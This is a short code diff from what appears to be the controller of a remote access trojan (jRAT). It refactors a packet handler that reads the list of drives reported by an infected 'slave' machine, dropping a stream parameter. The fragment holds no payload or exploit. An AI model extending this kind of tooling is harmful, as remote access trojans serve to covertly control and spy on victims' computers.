@@ -3,13 +3,11 @@ package jrat.controller.packets.incoming;
 import jrat.controller.Drive;
 import jrat.controller.Slave;
 
-import java.io.DataInputStream;
-
 
 public class Packet17InitDrives extends AbstractIncomingPacket {
 
 	@Override
-	public void read(Slave slave, DataInputStream dis) throws Exception {
+	public void read(Slave slave) throws Exception {
 		int len = slave.readInt();
 
 		slave.setDrives(new Drive[len]);
